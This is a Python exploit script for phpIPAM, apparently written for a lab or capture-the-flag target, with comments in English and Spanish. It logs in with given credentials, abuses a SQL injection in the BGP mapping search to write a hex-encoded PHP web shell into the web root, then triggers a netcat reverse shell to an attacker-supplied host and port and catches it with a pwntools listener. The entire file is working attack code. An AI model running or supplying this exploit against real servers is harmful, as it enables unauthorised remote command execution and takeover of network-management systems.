#!/usr/bin/python3

from pwn import *

import argparse
import requests
import time
import sys
import signal

# ctrl+c 
def def_handler(sig, frame):
    print("\n\n[!] Exit...\n")    
    sys.exit(1)
    
signal.signal(signal.SIGINT, def_handler)

# Configurar el parser de argumentos
parser = argparse.ArgumentParser()
parser.add_argument('-v', '--ip', help='IP address victim')
parser.add_argument('-i', '--lhosts', help='Attacker host')
parser.add_argument('-p', '--lport', help='Attacker port')

parser.add_argument('-usr', '--username', help='service username')
parser.add_argument('-pwd', '--password', help='service password')

# Obtener el valor del argumento
args = parser.parse_args()
ip_address = args.ip
lport = args.lport
lhosts = args.lhosts

username = args.username
password = args.password

# Parameter validation
if None in [ip_address, lport, lhosts, username, password]:
    print("\n[!] Missing arguments\n")
    parser.print_help()
    sys.exit(1)

# Function to start session in phpIPAM service
def loginApp():

    login_url = "http://{0}/app/login/login_check.php".format(ip_address)
    # We send the username and password, to obtain a session
    login_data = {
        'ipamusername': username,
        'ipampassword': password
    }
    
    session = requests.Session()
    session.post(login_url, data=login_data)
    # return the session in a variable with the same name for user used in the payload function
    return session

# function that uploads our malicious payload
def payload(session):

    url_payload = "http://{0}/app/admin/routing/edit-bgp-mapping-search.php".format(ip_address)
    # We send, as data, a PHP file to be uploaded to the specified path, taking advantage of the SQL injection.
    # <?php system($_GET["cmd"]); ?> HEX 
    data = {
    'subnet':''' " Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/cmd.php' -- - ''',
    'bgp_id': '1'
    }
    # Remember that we are using the section created in loginApp to upload this file.
    session.post(url_payload, data=data)

# Function to establish a reverse shell using the previously uploaded cmd file as the payload.
def shell():
    # We wait for two seconds to avoid issues with the connection.
    time.sleep(2)
    url_cmd = "http://{0}/cmd.php".format(ip_address)
    # We send our reverse shell in URL-encoded format and establish the connection.
    # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc lhosts lport >/tmp/f
    reverseShell = "rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20{0}%20{1}%20%3E%2Ftmp%2Ff".format(lhosts, lport)
    full_url = f"{url_cmd}?cmd={reverseShell}"
    
    requests.get(full_url)
    
# Function that listens on a port to receive the connection from the shell function.
def listening():
     
     # It establishes a connection on the same port as the shell function and waits a total of 20 seconds to receive the response.
    shell = listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
    # In case of not receiving an answer, we exit with the status code not successful.
        log.failure("Could not establish connection")
        sys.exit(1)
    else:
        shell.interactive()

def main():
    # we pass the session created in loginApp to payload
    session = loginApp()
    if session is not None:
        payload(session)
    # using threads we execute in parallel the shell function seconded that we can establish the connection with the listening function
    threading.Thread(target=shell, args=()).start()
    listening()
    
if __name__ == "__main__":
    main()